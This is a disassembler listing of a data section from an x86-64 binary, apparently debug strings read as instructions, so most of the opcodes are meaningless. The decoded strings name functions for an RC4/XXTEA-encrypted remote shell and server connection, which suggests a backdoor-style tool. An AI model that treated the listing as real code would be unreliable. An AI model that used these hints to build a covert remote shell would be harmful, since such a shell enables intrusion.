 1e6:	4f 54                	rex.WRXB push %r12
 1e8:	4f 5f                	rex.WRXB pop %r15
 1ea:	45 53                	rex.RB push %r11
 1ec:	50                   	push   %rax
 1ed:	00 72 63             	add    %dh,0x63(%rdx)
 1f0:	34 5f                	xor    $0x5f,%al
 1f2:	73 74                	jae    268 <_init-0x400b30>
 1f4:	61                   	(bad)  
 1f5:	74 65                	je     25c <_init-0x400b3c>
 1f7:	00 5f 5f             	add    %bl,0x5f(%rdi)
 1fa:	73 75                	jae    271 <_init-0x400b27>
 1fc:	73 65                	jae    263 <_init-0x400b35>
 1fe:	63 6f 6e             	movslq 0x6e(%rdi),%ebp
 201:	64                   	fs
 202:	73 5f                	jae    263 <_init-0x400b35>
 204:	74 00                	je     206 <_init-0x400b92>
 206:	5f                   	pop    %rdi
 207:	5f                   	pop    %rdi
 208:	46 55                	rex.RX push %rbp
 20a:	4e                   	rex.WRX
 20b:	43 54                	rex.XB push %r12
 20d:	49                   	rex.WB
 20e:	4f                   	rex.WRXB
 20f:	4e 5f                	rex.WRX pop %rdi
 211:	5f                   	pop    %rdi
 212:	00 74 69 6d          	add    %dh,0x6d(%rcx,%rbp,2)
 216:	65                   	gs
 217:	76 61                	jbe    27a <_init-0x400b1e>
 219:	6c                   	insb   (%dx),%es:(%rdi)
 21a:	00 73 69             	add    %dh,0x69(%rbx)
 21d:	67 6e                	outsb  %ds:(%esi),(%dx)
 21f:	75 6d                	jne    28e <_init-0x400b0a>
 221:	00 73 68             	add    %dh,0x68(%rbx)
 224:	6f                   	outsl  %ds:(%rsi),(%dx)
 225:	72 74                	jb     29b <_init-0x400afd>
 227:	20 75 6e             	and    %dh,0x6e(%rbp)
 22a:	73 69                	jae    295 <_init-0x400b03>
 22c:	67 6e                	outsb  %ds:(%esi),(%dx)
 22e:	65 64 20 69 6e       	gs and %ch,%fs:%gs:0x6e(%rcx)
 233:	74 00                	je     235 <_init-0x400b63>
 235:	73 69                	jae    2a0 <_init-0x400af8>
 237:	6e                   	outsb  %ds:(%rsi),(%dx)
 238:	5f                   	pop    %rdi
 239:	61                   	(bad)  
 23a:	64                   	fs
 23b:	64                   	fs
 23c:	72 00                	jb     23e <_init-0x400b5a>
 23e:	74 63                	je     2a3 <_init-0x400af5>
 240:	66                   	data16
 241:	6c                   	insb   (%dx),%es:(%rdi)
 242:	61                   	(bad)  
 243:	67 5f                	addr32 pop %rdi
 245:	74 00                	je     247 <_init-0x400b51>
 247:	6d                   	insl   (%dx),%es:(%rdi)
 248:	73 67                	jae    2b1 <_init-0x400ae7>
 24a:	5f                   	pop    %rdi
 24b:	69 6e 64 65 78 00 63 	imul   $0x63007865,0x64(%rsi),%ebp
 252:	5f                   	pop    %rdi
 253:	69 66 6c 61 67 00 49 	imul   $0x49006761,0x6c(%rsi),%esp
 25a:	50                   	push   %rax
 25b:	50                   	push   %rax
 25c:	52                   	push   %rdx
 25d:	4f 54                	rex.WRXB push %r12
 25f:	4f 5f                	rex.WRXB pop %r15
 261:	54                   	push   %rsp
 262:	50                   	push   %rax
 263:	00 63 5f             	add    %ah,0x5f(%rbx)
 266:	6f                   	outsl  %ds:(%rsi),(%dx)
 267:	73 70                	jae    2d9 <_init-0x400abf>
 269:	65 65 64 00 49 50    	gs gs add %cl,%fs:%gs:0x50(%rcx)
 26f:	50                   	push   %rax
 270:	52                   	push   %rdx
 271:	4f 54                	rex.WRXB push %r12
 273:	4f 5f                	rex.WRXB pop %r15
 275:	49 50                	rex.WB push %r8
 277:	56                   	push   %rsi
 278:	36 00 73 5f          	add    %dh,%ss:0x5f(%rbx)
 27c:	61                   	(bad)  
 27d:	64                   	fs
 27e:	64                   	fs
 27f:	72 00                	jb     281 <_init-0x400b17>
 281:	73 69                	jae    2ec <_init-0x400aac>
 283:	6e                   	outsb  %ds:(%rsi),(%dx)
 284:	5f                   	pop    %rdi
 285:	66                   	data16
 286:	61                   	(bad)  
 287:	6d                   	insl   (%dx),%es:(%rdi)
 288:	69 6c 79 00 74 62 74 	imul   $0x74746274,0x0(%rcx,%rdi,2),%ebp
 28f:	74 
 290:	72 00                	jb     292 <_init-0x400b06>
 292:	73 69                	jae    2fd <_init-0x400a9b>
 294:	7a 65                	jp     2fb <_init-0x400a9d>
 296:	74 79                	je     311 <_init-0x400a87>
 298:	70 65                	jo     2ff <_init-0x400a99>
 29a:	00 74 76 5f          	add    %dh,0x5f(%rsi,%rsi,2)
 29e:	73 65                	jae    305 <_init-0x400a93>
 2a0:	63 00                	movslq (%rax),%eax
 2a2:	77 73                	ja     317 <_init-0x400a81>
 2a4:	5f                   	pop    %rdi
 2a5:	63 6f 6c             	movslq 0x6c(%rdi),%ebp
 2a8:	00 6d 73             	add    %ch,0x73(%rbp)
 2ab:	67 5f                	addr32 pop %rdi
 2ad:	72 63                	jb     312 <_init-0x400a86>
 2af:	34 5f                	xor    $0x5f,%al
 2b1:	69 6e 64 65 78 00 47 	imul   $0x47007865,0x64(%rsi),%ebp
 2b8:	4e 55                	rex.WRX push %rbp
 2ba:	20 43 20             	and    %al,0x20(%rbx)
 2bd:	34 2e                	xor    $0x2e,%al
 2bf:	38 2e                	cmp    %ch,(%rsi)
 2c1:	34 20                	xor    $0x20,%al
 2c3:	2d 6d 74 75 6e       	sub    $0x6e75746d,%eax
 2c8:	65                   	gs
 2c9:	3d 67 65 6e 65       	cmp    $0x656e6567,%eax
 2ce:	72 69                	jb     339 <_init-0x400a5f>
 2d0:	63 20                	movslq (%rax),%esp
 2d2:	2d 6d 61 72 63       	sub    $0x6372616d,%eax
 2d7:	68 3d 78 38 36       	pushq  $0x3638783d
 2dc:	2d 36 34 20 2d       	sub    $0x2d203436,%eax
 2e1:	67 20 2d 66 73 74 61 	and    %ch,0x61747366(%eip)        # 6174764e <_end+0x6113e45e>
 2e8:	63 6b 2d             	movslq 0x2d(%rbx),%ebp
 2eb:	70 72                	jo     35f <_init-0x400a39>
 2ed:	6f                   	outsl  %ds:(%rsi),(%dx)
 2ee:	74 65                	je     355 <_init-0x400a43>
 2f0:	63 74 6f 72          	movslq 0x72(%rdi,%rbp,2),%esi
 2f4:	00 49 50             	add    %cl,0x50(%rcx)
 2f7:	50                   	push   %rax
 2f8:	52                   	push   %rdx
 2f9:	4f 54                	rex.WRXB push %r12
 2fb:	4f 5f                	rex.WRXB pop %r15
 2fd:	4d                   	rex.WRB
 2fe:	41 58                	pop    %r8
 300:	00 77 73             	add    %dh,0x73(%rdi)
 303:	5f                   	pop    %rdi
 304:	78 70                	js     376 <_init-0x400a22>
 306:	69 78 65 6c 00 53 4f 	imul   $0x4f53006c,0x65(%rax),%edi
 30d:	43                   	rex.XB
 30e:	4b 5f                	rex.WXB pop %r15
 310:	44                   	rex.R
 311:	43                   	rex.XB
 312:	43 50                	rex.XB push %r8
 314:	00 49 50             	add    %cl,0x50(%rcx)
 317:	50                   	push   %rax
 318:	52                   	push   %rdx
 319:	4f 54                	rex.WRXB push %r12
 31b:	4f 5f                	rex.WRXB pop %r15
 31d:	42                   	rex.X
 31e:	45                   	rex.RB
 31f:	45 54                	rex.RB push %r12
 321:	50                   	push   %rax
 322:	48 00 73 69          	rex.W add %sil,0x69(%rbx)
 326:	6e                   	outsb  %ds:(%rsi),(%dx)
 327:	5f                   	pop    %rdi
 328:	70 6f                	jo     399 <_init-0x4009ff>
 32a:	72 74                	jb     3a0 <_init-0x4009f8>
 32c:	00 73 61             	add    %dh,0x61(%rbx)
 32f:	5f                   	pop    %rdi
 330:	66                   	data16
 331:	61                   	(bad)  
 332:	6d                   	insl   (%dx),%es:(%rdi)
 333:	69 6c 79 00 43 6f 6e 	imul   $0x6e6e6f43,0x0(%rcx,%rdi,2),%ebp
 33a:	6e 
 33b:	65 63 74 69 6f       	movslq %gs:0x6f(%rcx,%rbp,2),%esi
 340:	6e                   	outsb  %ds:(%rsi),(%dx)
 341:	5f                   	pop    %rdi
 342:	44 61                	rex.R (bad) 
 344:	74 61                	je     3a7 <_init-0x4009f1>
 346:	5f                   	pop    %rdi
 347:	74 00                	je     349 <_init-0x400a4f>
 349:	5f                   	pop    %rdi
 34a:	5f                   	pop    %rdi
 34b:	73 6f                	jae    3bc <_init-0x4009dc>
 34d:	63 6b 65             	movslq 0x65(%rbx),%ebp
 350:	74 5f                	je     3b1 <_init-0x4009e7>
 352:	74 79                	je     3cd <_init-0x4009cb>
 354:	70 65                	jo     3bb <_init-0x4009dd>
 356:	00 63 5f             	add    %ah,0x5f(%rbx)
 359:	63 63 00             	movslq 0x0(%rbx),%esp
 35c:	49 50                	rex.WB push %r8
 35e:	50                   	push   %rax
 35f:	52                   	push   %rdx
 360:	4f 54                	rex.WRXB push %r12
 362:	4f 5f                	rex.WRXB pop %r15
 364:	50                   	push   %rax
 365:	55                   	push   %rbp
 366:	50                   	push   %rax
 367:	00 49 50             	add    %cl,0x50(%rcx)
 36a:	50                   	push   %rax
 36b:	52                   	push   %rdx
 36c:	4f 54                	rex.WRXB push %r12
 36e:	4f 5f                	rex.WRXB pop %r15
 370:	53                   	push   %rbx
 371:	43 54                	rex.XB push %r12
 373:	50                   	push   %rax
 374:	00 75 6e             	add    %dh,0x6e(%rbp)
 377:	73 69                	jae    3e2 <_init-0x4009b6>
 379:	67 6e                	outsb  %ds:(%esi),(%dx)
 37b:	65 64 20 63 68       	gs and %ah,%fs:%gs:0x68(%rbx)
 380:	61                   	(bad)  
 381:	72 00                	jb     383 <_init-0x400a15>
 383:	49 50                	rex.WB push %r8
 385:	50                   	push   %rax
 386:	52                   	push   %rdx
 387:	4f 54                	rex.WRXB push %r12
 389:	4f 5f                	rex.WRXB pop %r15
 38b:	52                   	push   %rdx
 38c:	41 57                	push   %r15
 38e:	00 63 72             	add    %ah,0x72(%rbx)
 391:	65                   	gs
 392:	61                   	(bad)  
 393:	74 65                	je     3fa <_init-0x40099e>
 395:	5f                   	pop    %rdi
 396:	73 65                	jae    3fd <_init-0x40099b>
 398:	72 76                	jb     410 <_init-0x400988>
 39a:	65                   	gs
 39b:	72 5f                	jb     3fc <_init-0x40099c>
 39d:	63 6f 6e             	movslq 0x6e(%rdi),%ebp
 3a0:	6e                   	outsb  %ds:(%rsi),(%dx)
 3a1:	65 63 74 69 6f       	movslq %gs:0x6f(%rcx,%rbp,2),%esi
 3a6:	6e                   	outsb  %ds:(%rsi),(%dx)
 3a7:	00 49 50             	add    %cl,0x50(%rcx)
 3aa:	50                   	push   %rax
 3ab:	52                   	push   %rdx
 3ac:	4f 54                	rex.WRXB push %r12
 3ae:	4f 5f                	rex.WRXB pop %r15
 3b0:	49                   	rex.WB
 3b1:	44 50                	rex.R push %rax
 3b3:	00 5f 5f             	add    %bl,0x5f(%rdi)
 3b6:	66                   	data16
 3b7:	64                   	fs
 3b8:	5f                   	pop    %rdi
 3b9:	6d                   	insl   (%dx),%es:(%rdi)
 3ba:	61                   	(bad)  
 3bb:	73 6b                	jae    428 <_init-0x400970>
 3bd:	00 73 68             	add    %dh,0x68(%rbx)
 3c0:	6f                   	outsl  %ds:(%rsi),(%dx)
 3c1:	72 74                	jb     437 <_init-0x400961>
 3c3:	20 69 6e             	and    %ch,0x6e(%rcx)
 3c6:	74 00                	je     3c8 <_init-0x4009d0>
 3c8:	63 5f 63             	movslq 0x63(%rdi),%ebx
 3cb:	66                   	data16
 3cc:	6c                   	insb   (%dx),%es:(%rdi)
 3cd:	61                   	(bad)  
 3ce:	67 00 6e 6f          	add    %ch,0x6f(%esi)
 3d2:	74 5f                	je     433 <_init-0x400965>
 3d4:	65 6e                	outsb  %gs:(%rsi),(%dx)
 3d6:	6f                   	outsl  %ds:(%rsi),(%dx)
 3d7:	75 67                	jne    440 <_init-0x400958>
 3d9:	68 5f 62 75 66       	pushq  $0x6675625f
 3de:	66                   	data16
 3df:	65                   	gs
 3e0:	72 5f                	jb     441 <_init-0x400957>
 3e2:	6c                   	insb   (%dx),%es:(%rdi)
 3e3:	65 6e                	outsb  %gs:(%rsi),(%dx)
 3e5:	67 74 68             	addr32 je 450 <_init-0x400948>
 3e8:	00 63 68             	add    %ah,0x68(%rbx)
 3eb:	65 63 6b 5f          	movslq %gs:0x5f(%rbx),%ebp
 3ef:	73 69                	jae    45a <_init-0x40093e>
 3f1:	67 73 00             	addr32 jae 3f4 <_init-0x4009a4>
 3f4:	77 73                	ja     469 <_init-0x40092f>
 3f6:	5f                   	pop    %rdi
 3f7:	79 70                	jns    469 <_init-0x40092f>
 3f9:	69 78 65 6c 00 77 69 	imul   $0x6977006c,0x65(%rax),%edi
 400:	6e                   	outsb  %ds:(%rsi),(%dx)
 401:	73 69                	jae    46c <_init-0x40092c>
 403:	7a 65                	jp     46a <_init-0x40092e>
 405:	00 72 65             	add    %dh,0x65(%rdx)
 408:	73 65                	jae    46f <_init-0x400929>
 40a:	74 5f                	je     46b <_init-0x40092d>
 40c:	74 65                	je     473 <_init-0x400925>
 40e:	72 6d                	jb     47d <_init-0x40091b>
 410:	69 6e 61 6c 00 74 76 	imul   $0x7674006c,0x61(%rsi),%ebp
 417:	5f                   	pop    %rdi
 418:	75 73                	jne    48d <_init-0x40090b>
 41a:	65 63 00             	movslq %gs:(%rax),%eax
 41d:	6e                   	outsb  %ds:(%rsi),(%dx)
 41e:	62                   	(bad)  
 41f:	5f                   	pop    %rdi
 420:	70 6b                	jo     48d <_init-0x40090b>
 422:	74 5f                	je     483 <_init-0x400915>
 424:	73 65                	jae    48b <_init-0x40090d>
 426:	6e                   	outsb  %ds:(%rsi),(%dx)
 427:	74 00                	je     429 <_init-0x40096f>
 429:	75 69                	jne    494 <_init-0x400904>
 42b:	6e                   	outsb  %ds:(%rsi),(%dx)
 42c:	74 33                	je     461 <_init-0x400937>
 42e:	32 5f 74             	xor    0x74(%rdi),%bl
 431:	00 49 50             	add    %cl,0x50(%rcx)
 434:	50                   	push   %rax
 435:	52                   	push   %rdx
 436:	4f 54                	rex.WRXB push %r12
 438:	4f 5f                	rex.WRXB pop %r15
 43a:	55                   	push   %rbp
 43b:	44 50                	rex.R push %rax
 43d:	4c                   	rex.WR
 43e:	49 54                	rex.WB push %r12
 440:	45 00 6c 61 73       	add    %r13b,0x73(%r9,%riz,2)
 445:	74 5f                	je     4a6 <_init-0x4008f2>
 447:	73 6c                	jae    4b5 <_init-0x4008e3>
 449:	61                   	(bad)  
 44a:	73 68                	jae    4b4 <_init-0x4008e4>
 44c:	00 49 50             	add    %cl,0x50(%rcx)
 44f:	50                   	push   %rax
 450:	52                   	push   %rdx
 451:	4f 54                	rex.WRXB push %r12
 453:	4f 5f                	rex.WRXB pop %r15
 455:	45                   	rex.RB
 456:	47 50                	rex.RXB push %r8
 458:	00 73 6f             	add    %dh,0x6f(%rbx)
 45b:	63 6b 61             	movslq 0x61(%rbx),%ebp
 45e:	64                   	fs
 45f:	64                   	fs
 460:	72 00                	jb     462 <_init-0x400936>
 462:	5f                   	pop    %rdi
 463:	5f                   	pop    %rdi
 464:	64 30 00             	xor    %al,%fs:(%rax)
 467:	5f                   	pop    %rdi
 468:	5f                   	pop    %rdi
 469:	64 31 00             	xor    %eax,%fs:(%rax)
 46c:	62                   	(bad)  
 46d:	75 66                	jne    4d5 <_init-0x4008c3>
 46f:	66                   	data16
 470:	65                   	gs
 471:	72 00                	jb     473 <_init-0x400925>
 473:	49 50                	rex.WB push %r8
 475:	50                   	push   %rax
 476:	52                   	push   %rdx
 477:	4f 54                	rex.WRXB push %r12
 479:	4f 5f                	rex.WRXB pop %r15
 47b:	49                   	rex.WB
 47c:	43                   	rex.XB
 47d:	4d 50                	rex.WRB push %r8
 47f:	00 73 65             	add    %dh,0x65(%rbx)
 482:	72 76                	jb     4fa <_init-0x40089e>
 484:	65                   	gs
 485:	72 5f                	jb     4e6 <_init-0x4008b2>
 487:	61                   	(bad)  
 488:	64                   	fs
 489:	64                   	fs
 48a:	72 00                	jb     48c <_init-0x40090c>
 48c:	49 50                	rex.WB push %r8
 48e:	50                   	push   %rax
 48f:	52                   	push   %rdx
 490:	4f 54                	rex.WRXB push %r12
 492:	4f 5f                	rex.WRXB pop %r15
 494:	47 52                	rex.RXB push %r10
 496:	45 00 77 73          	add    %r14b,0x73(%r15)
 49a:	5f                   	pop    %rdi
 49b:	72 6f                	jb     50c <_init-0x40088c>
 49d:	77 00                	ja     49f <_init-0x4008f9>
 49f:	74 6f                	je     510 <_init-0x400888>
 4a1:	74 61                	je     504 <_init-0x400894>
 4a3:	6c                   	insb   (%dx),%es:(%rdi)
 4a4:	00 2f                	add    %ch,(%rdi)
 4a6:	68 6f 6d 65 2f       	pushq  $0x2f656d6f
 4ab:	73 68                	jae    515 <_init-0x400883>
 4ad:	61                   	(bad)  
 4ae:	69 65 6e 6e 2f 77 6f 	imul   $0x6f772f6e,0x6e(%rbp),%esp
 4b5:	72 6b                	jb     522 <_init-0x400876>
 4b7:	73 70                	jae    529 <_init-0x40086f>
 4b9:	61                   	(bad)  
 4ba:	63 65 2f             	movslq 0x2f(%rbp),%esp
 4bd:	63 2f                	movslq (%rdi),%ebp
 4bf:	73 68                	jae    529 <_init-0x40086f>
 4c1:	65                   	gs
 4c2:	6c                   	insb   (%dx),%es:(%rdi)
 4c3:	6c                   	insb   (%dx),%es:(%rdi)
 4c4:	6f                   	outsl  %ds:(%rsi),(%dx)
 4c5:	67 00 5f 5f          	add    %bl,0x5f(%edi)
 4c9:	74 69                	je     534 <_init-0x400864>
 4cb:	6d                   	insl   (%dx),%es:(%rdi)
 4cc:	65                   	gs
 4cd:	5f                   	pop    %rdi
 4ce:	74 00                	je     4d0 <_init-0x4008c8>
 4d0:	73 61                	jae    533 <_init-0x400865>
 4d2:	5f                   	pop    %rdi
 4d3:	66                   	data16
 4d4:	61                   	(bad)  
 4d5:	6d                   	insl   (%dx),%es:(%rdi)
 4d6:	69 6c 79 5f 74 00 61 	imul   $0x72610074,0x5f(%rcx,%rdi,2),%ebp
 4dd:	72 
 4de:	67 76 00             	addr32 jbe 4e1 <_init-0x4008b7>
 4e1:	53                   	push   %rbx
 4e2:	4f                   	rex.WRXB
 4e3:	43                   	rex.XB
 4e4:	4b 5f                	rex.WXB pop %r15
 4e6:	43                   	rex.XB
 4e7:	4c                   	rex.WR
 4e8:	4f                   	rex.WRXB
 4e9:	45 58                	rex.RB pop %r8
 4eb:	45                   	rex.RB
 4ec:	43 00 63 63          	rex.XB add %spl,0x63(%r11)
 4f0:	5f                   	pop    %rdi
 4f1:	74 00                	je     4f3 <_init-0x4008a5>
 4f3:	53                   	push   %rbx
 4f4:	4f                   	rex.WRXB
 4f5:	43                   	rex.XB
 4f6:	4b 5f                	rex.WXB pop %r15
 4f8:	44                   	rex.R
 4f9:	47 52                	rex.RXB push %r10
 4fb:	41                   	rex.B
 4fc:	4d 00 73 6f          	rex.WRB add %r14b,0x6f(%r11)
 500:	63 6b 61             	movslq 0x61(%rbx),%ebp
 503:	64                   	fs
 504:	64                   	fs
 505:	72 5f                	jb     566 <_init-0x400832>
 507:	69 6e 00 49 50 50 52 	imul   $0x52505049,0x0(%rsi),%ebp
 50e:	4f 54                	rex.WRXB push %r12
 510:	4f 5f                	rex.WRXB pop %r15
 512:	41                   	rex.B
 513:	48 00 61 72          	rex.W add %spl,0x72(%rcx)
 517:	67 63 00             	movslq (%eax),%eax
 51a:	73 61                	jae    57d <_init-0x40081b>
 51c:	5f                   	pop    %rdi
 51d:	64                   	fs
 51e:	61                   	(bad)  
 51f:	74 61                	je     582 <_init-0x400816>
 521:	00 49 50             	add    %cl,0x50(%rcx)
 524:	50                   	push   %rax
 525:	52                   	push   %rdx
 526:	4f 54                	rex.WRXB push %r12
 528:	4f 5f                	rex.WRXB pop %r15
 52a:	49 50                	rex.WB push %r8
 52c:	49 50                	rex.WB push %r8
 52e:	00 53 4f             	add    %dl,0x4f(%rbx)
 531:	43                   	rex.XB
 532:	4b 5f                	rex.WXB pop %r15
 534:	52                   	push   %rdx
 535:	41 57                	push   %r15
 537:	00 53 4f             	add    %dl,0x4f(%rbx)
 53a:	43                   	rex.XB
 53b:	4b 5f                	rex.WXB pop %r15
 53d:	53                   	push   %rbx
 53e:	45 51                	rex.RB push %r9
 540:	50                   	push   %rax
 541:	41                   	rex.B
 542:	43                   	rex.XB
 543:	4b                   	rex.WXB
 544:	45 54                	rex.RB push %r12
 546:	00 6d 61             	add    %ch,0x61(%rbp)
 549:	69 6e 00 63 72 65 61 	imul   $0x61657263,0x0(%rsi),%ebp
 550:	74 65                	je     5b7 <_init-0x4007e1>
 552:	5f                   	pop    %rdi
 553:	72 65                	jb     5ba <_init-0x4007de>
 555:	61                   	(bad)  
 556:	6c                   	insb   (%dx),%es:(%rdi)
 557:	5f                   	pop    %rdi
 558:	73 68                	jae    5c2 <_init-0x4007d6>
 55a:	65                   	gs
 55b:	6c                   	insb   (%dx),%es:(%rdi)
 55c:	6c                   	insb   (%dx),%es:(%rdi)
 55d:	5f                   	pop    %rdi
 55e:	72 75                	jb     5d5 <_init-0x4007c3>
 560:	6e                   	outsb  %ds:(%rsi),(%dx)
 561:	5f                   	pop    %rdi
 562:	63 6d 64             	movslq 0x64(%rbp),%ebp
 565:	00 69 6e             	add    %ch,0x6e(%rcx)
 568:	5f                   	pop    %rdi
 569:	70 6f                	jo     5da <_init-0x4007be>
 56b:	72 74                	jb     5e1 <_init-0x4007b7>
 56d:	5f                   	pop    %rdi
 56e:	74 00                	je     570 <_init-0x400828>
 570:	49 50                	rex.WB push %r8
 572:	50                   	push   %rax
 573:	52                   	push   %rdx
 574:	4f 54                	rex.WRXB push %r12
 576:	4f 5f                	rex.WRXB pop %r15
 578:	4d 54                	rex.WRB push %r12
 57a:	50                   	push   %rax
 57b:	00 73 70             	add    %dh,0x70(%rbx)
 57e:	65                   	gs
 57f:	65                   	gs
 580:	64                   	fs
 581:	5f                   	pop    %rdi
 582:	74 00                	je     584 <_init-0x400814>
 584:	70 6b                	jo     5f1 <_init-0x4007a7>
 586:	74 6b                	je     5f3 <_init-0x4007a5>
 588:	65                   	gs
 589:	79 00                	jns    58b <_init-0x40080d>
 58b:	5f                   	pop    %rdi
 58c:	5f                   	pop    %rdi
 58d:	66                   	data16
 58e:	64                   	fs
 58f:	73 5f                	jae    5f0 <_init-0x4007a8>
 591:	62                   	(bad)  
 592:	69 74 73 00 58 58 54 	imul   $0x45545858,0x0(%rbx,%rsi,2),%esi
 599:	45 
 59a:	41 5f                	pop    %r15
 59c:	45 6e                	rex.RB outsb %ds:(%rsi),(%dx)
 59e:	63 72 79             	movslq 0x79(%rdx),%esi
 5a1:	70 74                	jo     617 <_init-0x400781>
 5a3:	00 74 6d 5f          	add    %dh,0x5f(%rbp,%rbp,2)
 5a7:	77 64                	ja     60d <_init-0x40078b>
 5a9:	61                   	(bad)  
 5aa:	79 00                	jns    5ac <_init-0x4007ec>
 5ac:	6e                   	outsb  %ds:(%rsi),(%dx)
 5ad:	6f                   	outsl  %ds:(%rsi),(%dx)
 5ae:	77 5f                	ja     60f <_init-0x400789>
 5b0:	74 6d                	je     61f <_init-0x400779>
 5b2:	00 58 58             	add    %bl,0x58(%rax)
 5b5:	54                   	push   %rsp
 5b6:	45                   	rex.RB
 5b7:	41 5f                	pop    %r15
 5b9:	44                   	rex.R
 5ba:	65 63 72 79          	movslq %gs:0x79(%rdx),%esi
 5be:	70 74                	jo     634 <_init-0x400764>
 5c0:	00 74 6d 5f          	add    %dh,0x5f(%rbp,%rbp,2)
 5c4:	68 6f 75 72 00       	pushq  $0x72756f
 5c9:	74 6d                	je     638 <_init-0x400760>
 5cb:	5f                   	pop    %rdi
 5cc:	7a 6f                	jp     63d <_init-0x40075b>
 5ce:	6e                   	outsb  %ds:(%rsi),(%dx)
 5cf:	65 00 74 6d 5f       	add    %dh,%gs:0x5f(%rbp,%rbp,2)
 5d4:	67 6d                	insl   (%dx),%es:(%edi)
 5d6:	74 6f                	je     647 <_init-0x400751>
 5d8:	66                   	data16
 5d9:	66                   	data16
 5da:	00 73 69             	add    %dh,0x69(%rbx)
 5dd:	7a 65                	jp     644 <_init-0x400754>
 5df:	5f                   	pop    %rdi
 5e0:	74 00                	je     5e2 <_init-0x4007b6>
 5e2:	72 6f                	jb     653 <_init-0x400745>
 5e4:	75 6e                	jne    654 <_init-0x400744>
 5e6:	64                   	fs
 5e7:	73 00                	jae    5e9 <_init-0x4007af>
 5e9:	74 6d                	je     658 <_init-0x400740>
 5eb:	5f                   	pop    %rdi
 5ec:	6d                   	insl   (%dx),%es:(%rdi)
 5ed:	69 6e 00 74 6d 5f 73 	imul   $0x735f6d74,0x0(%rsi),%ebp
 5f4:	65 63 00             	movslq %gs:(%rax),%eax
 5f7:	74 6d                	je     666 <_init-0x400732>
 5f9:	5f                   	pop    %rdi
 5fa:	69 73 64 73 74 00 75 	imul   $0x75007473,0x64(%rbx),%esi
 601:	74 69                	je     66c <_init-0x40072c>
 603:	6c                   	insb   (%dx),%es:(%rdi)
 604:	73 2e                	jae    634 <_init-0x400764>
 606:	63 00                	movslq (%rax),%eax
 608:	74 6d                	je     677 <_init-0x400721>
 60a:	5f                   	pop    %rdi
 60b:	79 64                	jns    671 <_init-0x400727>
 60d:	61                   	(bad)  
 60e:	79 00                	jns    610 <_init-0x400788>
 610:	70 72                	jo     684 <_init-0x400714>
 612:	65                   	gs
 613:	74 74                	je     689 <_init-0x40070f>
 615:	79 5f                	jns    676 <_init-0x400722>
 617:	74 69                	je     682 <_init-0x400716>
 619:	6d                   	insl   (%dx),%es:(%rdi)
 61a:	65 00 74 6d 5f       	add    %dh,%gs:0x5f(%rbp,%rbp,2)
 61f:	6d                   	insl   (%dx),%es:(%rdi)
 620:	6f                   	outsl  %ds:(%rsi),(%dx)
 621:	6e                   	outsb  %ds:(%rsi),(%dx)
 622:	00 74 6d 5f          	add    %dh,0x5f(%rbp,%rbp,2)
 626:	79 65                	jns    68d <_init-0x40070b>
 628:	61                   	(bad)  
 629:	72 00                	jb     62b <_init-0x40076d>
 62b:	5f                   	pop    %rdi
 62c:	5f                   	pop    %rdi
 62d:	6f                   	outsl  %ds:(%rsi),(%dx)
 62e:	66 66 5f             	data32 pop %di
 631:	74 00                	je     633 <_init-0x400765>
 633:	5f                   	pop    %rdi
 634:	5f                   	pop    %rdi
 635:	70 72                	jo     6a9 <_init-0x4006ef>
 637:	69 6e 74 5f 6f 75 74 	imul   $0x74756f5f,0x74(%rsi),%ebp
 63e:	70 75                	jo     6b5 <_init-0x4006e3>
 640:	74 00                	je     642 <_init-0x400756>
 642:	74 6d                	je     6b1 <_init-0x4006e7>
 644:	5f                   	pop    %rdi
 645:	6d                   	insl   (%dx),%es:(%rdi)
 646:	64                   	fs
 647:	61                   	(bad)  
 648:	79 00                	jns    64a <_init-0x40074e>
 64a:	6d                   	insl   (%dx),%es:(%rdi)
 64b:	73 67                	jae    6b4 <_init-0x4006e4>
 64d:	6c                   	insb   (%dx),%es:(%rdi)
 64e:	65 6e                	outsb  %gs:(%rsi),(%dx)
 650:	00 6c 65 66          	add    %ch,0x66(%rbp,%riz,2)
 654:	74 00                	je     656 <_init-0x400742>
 656:	73 68                	jae    6c0 <_init-0x4006d8>
 658:	61                   	(bad)  
 659:	31 5f 66             	xor    %ebx,0x66(%rdi)
 65c:	69 6e 69 73 68 00 73 	imul   $0x73006873,0x69(%rsi),%ebp
 663:	68 61 31 5f 70       	pushq  $0x705f3161
 668:	61                   	(bad)  
 669:	64 64 69 6e 67 00 73 	fs imul $0x61687300,%fs:0x67(%rsi),%ebp
 670:	68 61 
 672:	31 5f 75             	xor    %ebx,0x75(%rdi)
 675:	70 64                	jo     6db <_init-0x4006bd>
 677:	61                   	(bad)  
 678:	74 65                	je     6df <_init-0x4006b9>
 67a:	00 73 68             	add    %dh,0x68(%rbx)
 67d:	61                   	(bad)  
 67e:	31 5f 70             	xor    %ebx,0x70(%rdi)
 681:	72 6f                	jb     6f2 <_init-0x4006a6>
 683:	63 65 73             	movslq 0x73(%rbp),%esp
 686:	73 00                	jae    688 <_init-0x400710>
 688:	69 6e 70 75 74 00 66 	imul   $0x66007475,0x70(%rsi),%ebp
 68f:	69 6c 6c 00 73 68 61 	imul   $0x31616873,0x0(%rsp,%rbp,2),%ebp
 696:	31 
 697:	2e 63 00             	movslq %cs:(%rax),%eax
 69a:	70 61                	jo     6fd <_init-0x40069b>
 69c:	64 6e                	outsb  %fs:(%rsi),(%dx)
 69e:	00 68 69             	add    %ch,0x69(%rax)
 6a1:	67 68 00 74 65 6d    	addr32 pushq $0x6d657400
 6a7:	70 00                	jo     6a9 <_init-0x4006ef>
 6a9:	6c                   	insb   (%dx),%es:(%rdi)
 6aa:	61                   	(bad)  
 6ab:	73 74                	jae    721 <_init-0x400677>
 6ad:	00 73 68             	add    %dh,0x68(%rbx)
 6b0:	61                   	(bad)  
 6b1:	31 5f 73             	xor    %ebx,0x73(%rdi)
 6b4:	74 61                	je     717 <_init-0x400681>
 6b6:	72 74                	jb     72c <_init-0x40066c>
 6b8:	73 00                	jae    6ba <_init-0x4006de>
 6ba:	64 69 67 65 73 74 00 	imul   $0x72007473,%fs:0x65(%rdi),%esp
 6c1:	72 
 6c2:	63 34 2e             	movslq (%rsi,%rbp,1),%esi
 6c5:	63 00                	movslq (%rax),%eax
 6c7:	72 63                	jb     72c <_init-0x40066c>
 6c9:	34 5f                	xor    $0x5f,%al
 6cb:	73 65                	jae    732 <_init-0x400666>
 6cd:	74 75                	je     744 <_init-0x400654>
 6cf:	70 00                	jo     6d1 <_init-0x4006c7>
 6d1:	72 63                	jb     736 <_init-0x400662>
 6d3:	34 5f                	xor    $0x5f,%al
 6d5:	63 72 79             	movslq 0x79(%rdx),%esi
 6d8:	70 74                	jo     74e <_init-0x40064a>
	...
